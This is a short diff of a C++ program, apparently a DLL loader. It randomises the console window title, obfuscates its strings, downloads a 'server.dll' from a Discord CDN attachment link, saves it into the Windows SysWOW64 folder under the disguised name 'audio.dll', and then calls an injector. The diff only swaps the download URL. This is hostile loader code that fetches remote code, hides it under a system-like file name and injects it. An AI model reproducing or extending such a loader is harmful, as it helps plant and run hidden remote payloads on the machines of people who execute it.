@@ -77,7 +77,7 @@ int main()
 {
     SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
 
-    std::string dll = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891653781832486972/server.dll").c_str());
+    std::string dll = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891659436341477376/server.dll").c_str());
     std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
     URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
     injector();
